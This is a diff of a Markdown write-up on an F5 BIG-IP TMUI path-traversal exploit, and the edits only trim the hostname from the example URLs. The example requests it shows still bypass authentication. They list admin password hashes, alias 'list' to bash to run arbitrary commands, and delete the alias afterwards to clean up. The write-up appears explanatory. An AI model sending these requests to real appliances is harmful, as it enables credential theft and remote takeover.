@@ -38,7 +38,7 @@ https://[hostname]/tmui/login.jsp
 ```
 The exploit is a "..;" following the above URL. The URL below is an example of an exploitable URL that will return a list of all of the admin users along with their password hashes:
 ```
-https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
+/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
 ```
 
 > **The Three Most Common Exploits**
@@ -61,7 +61,7 @@ https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command
 While the above execute command can only access tmsh commands, you can use "create alias" to allow execution of any bash command! "Create alias" can be used to link the tmsh "list" command to the "bash" command. The following is what the command will look like:
 
 ```
-https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
+/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
 ```
 
 Once the alias is created, more requests can be sent in the same manner in subsequent requests containing any bash commands the user would like to execute, the word "bash" in the command must simply be replaced with "list". 
@@ -81,7 +81,7 @@ tmshCmd.jsp?command=list+/tmp/cmd
 Finally, in order to delete the alias and clean up:
 
 ```
-https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list
+/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list
 ```
 
 ## Why This Exploit Works
